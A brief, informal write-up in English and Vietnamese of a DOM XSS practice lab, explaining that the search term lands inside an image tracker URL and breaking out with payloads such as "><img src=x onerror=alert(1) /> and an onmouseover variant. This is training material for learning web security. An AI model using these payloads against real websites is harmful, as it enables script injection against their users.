welcome back this lab about DOM XSS
Đây là yêu cầu của chúng ta 

![Alt text](image-9.png)
Làm mình ngáo quá trường hợp này nó đã ulr encode đoạn giống lab1 rồi nên là không được thay vào đó nó cộng chuỗi hẳn vào cái ảnh để search luôn
![Alt text](image-10.png)
Nó như này bây giờ tìm cách tách ra thôi
<img src="/resources/images/tracker.gif?searchTerms=x"><img src=x onerror=alert("hihi")">

![Alt text](image-11.png)
                                        "><img src=x onmouseover=alert(1) />
Với payload như trên khi bạn di chuột qua ảnh sẽ alert(1)
                                        "><img src=x onerror=alert(1) />
hoặc như này và nhiều lắm
chúc các bạn thành công @@